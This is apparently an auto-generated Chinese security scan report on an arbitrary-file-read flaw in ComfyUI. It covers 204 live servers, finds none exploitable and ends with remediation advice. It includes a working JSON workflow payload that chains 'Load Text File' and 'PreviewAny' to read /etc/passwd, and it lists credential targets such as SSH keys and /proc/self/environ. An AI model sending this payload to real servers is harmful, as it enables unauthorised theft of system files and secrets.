# ComfyUI 安全检测报告

> **检测时间**: 2026-06-28 08:07:38
> **检测范围**: 204 个存活节点
> **漏洞类型**: 任意文件读取 (Path Traversal / Arbitrary File Read)
> **攻击向量**: `Load Text File` + `PreviewAny` 组合节点

## 概要

| 指标 | 数值 |
|------|------|
| 存活节点 | 204 |
| 安装攻击所需节点 | 0 |
| **可成功利用** | **0** |
| 利用率 | 0.0% |

## 漏洞原理

ComfyUI 的 `Load Text File` 节点可直接读取服务器本地文件，而 `PreviewAny` 节点会将结果以文本形式返回。两者组合即构成**任意文件读取**漏洞：

```json
{
  "1": {
    "class_type": "Load Text File",
    "inputs": {
      "file_path": "/etc/passwd",
      "dictionary_name": "sec_test"
    }
  },
  "2": {
    "class_type": "PreviewAny",
    "inputs": {"source": ["1", 0]}
  }
}
```

**影响范围**: 攻击者可在无认证情况下读取服务器任意文件，包括 `/etc/passwd`、`/proc/self/environ`、SSH 密钥、数据库配置等敏感信息。

---

## 可利用节点详情

*本次检测未发现可利用节点*

---

## 修复建议

1. **禁用 Load Text File 节点**: 在 `custom_nodes` 中移除或禁用该节点
2. **限制文件访问路径**: 修改节点代码，限制只能读取 `input/` 目录下的文件
3. **启用 API 认证**: 配置 ComfyUI 的 `--listen` 和认证中间件，禁止未授权访问
4. **网络隔离**: 将 ComfyUI 服务置于内网，不直接暴露到公网
5. **容器化部署**: 使用 Docker 运行，限制文件系统访问范围
